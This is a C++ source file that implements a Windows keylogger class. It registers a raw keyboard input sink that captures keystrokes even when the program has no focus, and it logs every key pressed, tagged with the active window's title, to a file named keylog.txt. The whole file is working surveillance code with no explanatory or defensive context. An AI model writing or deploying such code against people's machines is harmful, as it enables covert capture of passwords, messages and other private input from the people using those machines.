#include "KeyLogger.h"
#include "VirtualKeyToAscii.h"

BOOL KeyLogger::Init(HWND hWnd)
{
	RAWINPUTDEVICE rawinputDevice = { 0 };
	rawinputDevice.usUsagePage = 0x01;
	rawinputDevice.usUsage = 0x06;
	rawinputDevice.dwFlags = RIDEV_INPUTSINK;
	rawinputDevice.hwndTarget = hWnd;
	BOOL bRet = RegisterRawInputDevices(&rawinputDevice, 1, sizeof(rawinputDevice));
	if (bRet == FALSE)
	{
		MessageBox(NULL, _T("RegisterRawInputDevices"), _T("Failed"), MB_OK);
		return FALSE;
	}

	return TRUE;
}


BOOL KeyLogger::GetData(LPARAM lParam)
{
	RAWINPUT rawinputData = { 0 };
	UINT uiSize = sizeof(rawinputData);

	GetRawInputData((HRAWINPUT)lParam, RID_INPUT, &rawinputData, &uiSize, sizeof(RAWINPUTHEADER));
	if (rawinputData.header.dwType == RIM_TYPEKEYBOARD)
	{
		if ((rawinputData.data.keyboard.Message == WM_KEYDOWN) ||
			(rawinputData.data.keyboard.Message == WM_SYSKEYDOWN))
		{
			SaveKey(rawinputData.data.keyboard.VKey);
		}
	}
	return TRUE;
}


void KeyLogger::SaveKey(USHORT usVKey)
{
	char szKey[MAX_PATH] = { 0 };
	char szTitle[MAX_PATH] = { 0 };
	char szText[MAX_PATH] = { 0 };
	FILE* fp = NULL;
	HWND hForegroundWnd = GetForegroundWindow();
	GetWindowText(hForegroundWnd, szTitle, 256);
	lstrcpy(szKey, GetKeyName(usVKey));
	wsprintf(szText, "[%s] %s\r\n", szTitle, szKey);
	fopen_s(&fp, "keylog.txt", "a+");
	if (fp == NULL)
	{
		MessageBox(NULL, _T("fopen_s"), _T("Failed"), MB_OK);
		return;
	}
	fwrite(szText, (1 + ::lstrlen(szText)), 1, fp);
	fclose(fp);
}